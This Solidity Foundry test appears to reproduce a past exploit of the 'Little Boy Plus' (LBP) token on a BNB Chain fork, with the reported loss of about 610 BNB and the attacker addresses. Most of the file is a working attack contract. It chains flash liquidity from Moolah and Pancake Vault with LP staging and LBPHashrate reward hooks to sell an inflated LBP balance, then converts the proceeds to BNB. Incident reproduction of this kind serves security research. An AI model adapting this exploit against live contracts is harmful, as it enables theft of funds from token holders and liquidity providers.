// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "../basetest.sol";
import "../interface.sol";

// @KeyInfo - Total Lost : 610.56 BNB
// Attacker : 0xb26dfe6b6180a30e2a2d9826867cc7e06631825a
// Attack Contract : 0x5449ded887576f43fc339851e942ebc1e6f8118b
// Vulnerable Contract : 0x88886f0fd371dff856291badced45922bc888888
// Attack Tx : https://bscscan.com/tx/0x55856d9fda4c5be5193561c7d775e823c3d6e499da44aab9da963daf61c50b0c

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x88886f0fd371dff856291badced45922bc888888#code

// @Analysis
// Twitter Guy : https://x.com/DefimonAlerts/status/2067329401977532429
//
// The attacker used Moolah and Pancake Vault flash liquidity to stage LBP LP credit, trigger LBPHashrate reward
// accounting, and sell the inflated LBP balance exposed by LBP.balanceOf(). The final USDT was swapped to WBNB,
// unwrapped, and forwarded as BNB profit after a 5 BNB builder payment.

address constant TX_SENDER = 0xb26DFE6b6180A30e2A2D9826867cc7e06631825a;
address constant PROFIT_RECEIVER = 0x515788797914Cb663114aEb806B3CFb6096F6D1A;
address constant BUILDER_PAYMENT_RECEIVER = 0x4848489f0b2BEdd788c696e2D79b6b69D7484848;
address constant ATTACK_DEPLOYER = 0x202bA7498C65F9F5C49b9c90953B562F9e0538FB;
address constant ATTACK_COORDINATOR = 0x5449ded887576f43Fc339851e942eBc1E6F8118b;

address constant USDT_TOKEN = 0x55d398326f99059fF775485246999027B3197955;
address constant WBNB_TOKEN = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
address constant LBP = 0x88886f0fD371dfF856291bAdcEd45922bC888888;
address constant LBP_PAIR = 0x00e3Ea08fD8CBaD955Ec5d2292Ad637670c31524;
address constant USDT_WBNB_PAIR = 0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE;
address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

address constant MOOLAH_PROXY = 0x8F73b65B4caAf64FBA2aF91cC5D4a2A1318E5D8C;
address constant PANCAKE_VAULT = 0x238a358808379702088667322f80aC48bAd5e6c4;
address constant LBP_HASHRATE = 0x5E3cBc82D020be91a989Eb747934104E9AB585Fe;
address constant POL_VAULT = 0x01c87119a0D1C3730534b8d909eFeB1911b9fdB0;
address constant REFERRAL_ROOT = 0x51EDEAb1CEa55570b246b3A1E42DAba9027c5cc2;

interface IMoolahFlashLoan {
    function flashLoan(
        address token,
        uint256 assets,
        bytes calldata data
    ) external;
}

interface IPancakeVault {
    function lock(
        bytes calldata data
    ) external returns (bytes memory result);
    function take(
        address currency,
        address to,
        uint256 amount
    ) external;
    function sync(
        address currency
    ) external;
    function settle() external payable returns (uint256);
}

interface ILockCallback {
    function lockAcquired(
        bytes calldata data
    ) external returns (bytes memory result);
}

interface IMoolahFlashLoanCallback {
    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata data
    ) external;
}

interface ILBPToken is IERC20 {
    function rawBalanceOf(
        address account
    ) external view returns (uint256);
}

interface ILBPHashrate is IERC20 {
    function bindReferral(
        address upline
    ) external;
}

interface IPolVault {
    function flushPol() external returns (uint256 liquidityAdded);
}

contract ContractTest is BaseTestWithBalanceLog {
    function setUp() public {
        uint256 forkBlock = 104_727_183;
        vm.createSelectFork("bsc", forkBlock);
        fundingToken = address(0);

        vm.label(TX_SENDER, "Transaction sender");
        vm.label(ATTACK_DEPLOYER, "Attack deployer");
        vm.label(ATTACK_COORDINATOR, "Attack coordinator");
        vm.label(PROFIT_RECEIVER, "Profit receiver");
        vm.label(BUILDER_PAYMENT_RECEIVER, "Builder payment receiver");
        vm.label(USDT_TOKEN, "USDT");
        vm.label(WBNB_TOKEN, "WBNB");
        vm.label(LBP, "Little Boy Plus");
        vm.label(LBP_PAIR, "LBP/USDT pair");
        vm.label(USDT_WBNB_PAIR, "USDT/WBNB pair");
        vm.label(MOOLAH_PROXY, "Moolah proxy");
        vm.label(PANCAKE_VAULT, "Pancake Vault");
        vm.label(LBP_HASHRATE, "LBPHashrate");
        vm.label(POL_VAULT, "PolVault");
    }

    function testExploit() public balanceLog2(PROFIT_RECEIVER) {
        uint256 profitBefore = PROFIT_RECEIVER.balance;

        vm.startPrank(TX_SENDER);
        LBPAttackDeployer deployer = new LBPAttackDeployer();
        assertEq(address(deployer), ATTACK_DEPLOYER, "unexpected attack deployer address");
        address coordinator = deployer.run();
        assertEq(coordinator, ATTACK_COORDINATOR, "unexpected attack coordinator address");
        vm.stopPrank();

        uint256 bnbProfit = PROFIT_RECEIVER.balance - profitBefore;
        emit log_named_decimal_uint("Profit receiver BNB profit", bnbProfit, 18);

        assertGt(bnbProfit, 590 ether, "BNB profit below expected impact");
    }
}

contract LBPAttackDeployer {
    function run() external returns (address coordinator) {
        LBPAttack attack = new LBPAttack();
        coordinator = address(attack);
        attack.run();
    }
}

contract LBPAttack is IMoolahFlashLoanCallback, ILockCallback {
    IERC20 private constant usdt = IERC20(USDT_TOKEN);
    ILBPToken private constant lbp = ILBPToken(LBP);
    IWBNB private constant wbnb = IWBNB(payable(WBNB_TOKEN));
    IPancakeRouter private constant router = IPancakeRouter(payable(PANCAKE_ROUTER));
    IPancakePair private constant lbpPair = IPancakePair(LBP_PAIR);
    IPancakePair private constant usdtWbnbPair = IPancakePair(USDT_WBNB_PAIR);
    IMoolahFlashLoan private constant moolah = IMoolahFlashLoan(MOOLAH_PROXY);
    IPancakeVault private constant vault = IPancakeVault(PANCAKE_VAULT);
    ILBPHashrate private constant hashrate = ILBPHashrate(LBP_HASHRATE);
    IPolVault private constant polVault = IPolVault(POL_VAULT);

    uint256 private expectedFlashUsdt;

    receive() external payable {}

    function run() external {
        usdt.approve(MOOLAH_PROXY, type(uint256).max);

        // step 1: borrow all USDT liquidity visible in Moolah; callback performs the LBP manipulation.
        expectedFlashUsdt = usdt.balanceOf(MOOLAH_PROXY);
        moolah.flashLoan(USDT_TOKEN, expectedFlashUsdt, "");

        // step 6: after Moolah pulls repayment, convert all remaining USDT to BNB.
        _swapAllUsdtToWbnb();
        uint256 wbnbBalance = wbnb.balanceOf(address(this));
        wbnb.withdraw(wbnbBalance);

        uint256 builderPayment = 5 ether;
        payable(BUILDER_PAYMENT_RECEIVER).transfer(builderPayment);
        payable(PROFIT_RECEIVER).transfer(address(this).balance);
    }

    function onMoolahFlashLoan(
        uint256 assets,
        bytes calldata
    ) external {
        require(msg.sender == MOOLAH_PROXY, "unexpected flash lender");
        require(assets == expectedFlashUsdt, "unexpected flash amount");

        // step 2: enter Pancake Vault lock and take transient USDT liquidity.
        vault.lock("");
    }

    function lockAcquired(
        bytes calldata
    ) external returns (bytes memory) {
        require(msg.sender == PANCAKE_VAULT, "unexpected vault");

        uint256 vaultUsdt = usdt.balanceOf(PANCAKE_VAULT);
        vault.take(USDT_TOKEN, address(this), vaultUsdt);

        // step 3: use staged LBP/USDT liquidity and PolVault side effects to mint hLBP credit.
        uint256 firstBuyUsdt = 1000 ether;
        uint256 dustBuyUsdt = 1 ether;
        uint256 pumpBuyUsdt = 15_000_000 ether;

        _buyLbp(firstBuyUsdt);
        uint256 firstStageLbp = lbp.balanceOf(address(this)) * 99 / 100;
        _transferLbpAndBalancedUsdt(firstStageLbp, LBP_PAIR);
        polVault.flushPol();
        hashrate.bindReferral(REFERRAL_ROOT);

        _buyLbp(dustBuyUsdt);
        _buyLbp(pumpBuyUsdt);
        _stageSecondLbpLiquidity();

        // step 4: force hLBP hooks and harvest LBP rewards, then sell the inflated LBP balance.
        lbp.transfer(address(this), 0);
        hashrate.transferFrom(LBP_PAIR, address(0xdead), 0);
        _sellAllVisibleLbpForUsdt();

        // step 5: repay the Pancake Vault transient delta.
        vault.sync(USDT_TOKEN);
        usdt.transfer(PANCAKE_VAULT, vaultUsdt);
        vault.settle();

        return "";
    }

    function _buyLbp(
        uint256 usdtAmount
    ) private returns (uint256 lbpOut) {
        address[] memory path = new address[](2);
        path[0] = USDT_TOKEN;
        path[1] = LBP;
        lbpOut = router.getAmountsOut(usdtAmount, path)[1];

        usdt.transfer(LBP_PAIR, usdtAmount);
        lbpPair.swap(0, lbpOut, address(this), "");
    }

    function _stageSecondLbpLiquidity() private {
        // Trace reads the pair LBP balance, then stages 3/8 of it with proportional USDT.
        uint256 pairLbpBalance = lbp.balanceOf(LBP_PAIR);
        uint256 stagedLbp = pairLbpBalance * 3 / 8;

        (uint112 reserveUsdt, uint112 reserveLbp,) = lbpPair.getReserves();
        uint256 balancedUsdtForPairBalance = pairLbpBalance * uint256(reserveUsdt) / uint256(reserveLbp);
        uint256 stagedUsdt = balancedUsdtForPairBalance * 3 / 8;

        lbp.transfer(LBP_PAIR, stagedLbp);
        usdt.transfer(LBP_PAIR, stagedUsdt);
        lbpPair.skim(LBP_PAIR);
        lbpPair.mint(address(this));
    }

    function _transferLbpAndBalancedUsdt(
        uint256 lbpGross,
        address lpReceiver
    ) private {
        uint256 pairLbpBefore = lbp.rawBalanceOf(LBP_PAIR);
        lbp.transfer(LBP_PAIR, lbpGross);
        uint256 lbpNet = lbp.rawBalanceOf(LBP_PAIR) - pairLbpBefore;

        (uint112 reserveUsdt, uint112 reserveLbp,) = lbpPair.getReserves();
        uint256 usdtAmount = lbpNet * uint256(reserveUsdt) / uint256(reserveLbp);
        usdt.transfer(LBP_PAIR, usdtAmount);
        lbpPair.mint(lpReceiver);
    }

    function _sellAllVisibleLbpForUsdt() private {
        uint256 lbpAmount = lbp.balanceOf(address(this));
        (uint112 reserveUsdt, uint112 reserveLbp,) = lbpPair.getReserves();

        lbp.transfer(LBP_PAIR, lbpAmount);
        uint256 pairLbpInput = lbp.rawBalanceOf(LBP_PAIR) - uint256(reserveLbp);
        uint256 usdtOut = router.getAmountOut(pairLbpInput, uint256(reserveLbp), uint256(reserveUsdt));
        lbpPair.swap(usdtOut, 0, address(this), "");
    }

    function _swapAllUsdtToWbnb() private {
        uint256 usdtAmount = usdt.balanceOf(address(this));
        uint256 wbnbOut = _getAmountOutFromPair(usdtWbnbPair, usdtAmount, true);
        usdt.transfer(USDT_WBNB_PAIR, usdtAmount);
        usdtWbnbPair.swap(0, wbnbOut, address(this), "");
    }

    function _getAmountOutFromPair(
        IPancakePair pair,
        uint256 amountIn,
        bool token0In
    ) private view returns (uint256) {
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        if (token0In) return router.getAmountOut(amountIn, reserve0, reserve1);
        return router.getAmountOut(amountIn, reserve1, reserve0);
    }
}
